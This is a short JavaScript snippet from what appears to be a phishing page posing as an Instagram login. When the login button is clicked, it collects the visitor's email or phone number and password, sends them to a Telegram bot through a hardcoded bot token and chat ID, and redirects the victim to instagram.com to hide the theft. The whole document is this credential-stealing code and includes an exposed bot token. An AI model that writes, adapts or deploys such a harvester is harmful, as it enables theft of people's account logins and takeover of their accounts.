document.getElementById('login').addEventListener('click', function(){
  window.location.href = 'https://instagram.com'; 

var text = `Email ou Numéro: ${email.value} 
Mot de passe:  ${password.value}`; 

const botToken = '8050520847:AAHt7mqeO8JxIRZtxjOszBJQst-T3PuRmTU'; 
const chatId = '7516234305'; 
const message = text; 

fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", { 
method: 'POST', 
headers: { 
  'Content-Type': 'application/json' 
}, 
body: JSON.stringify({ 
  chat_id: chatId, 
  text: message 
}) 
}) 

.catch(error => { 
alert('Error:', error); 
}); 

});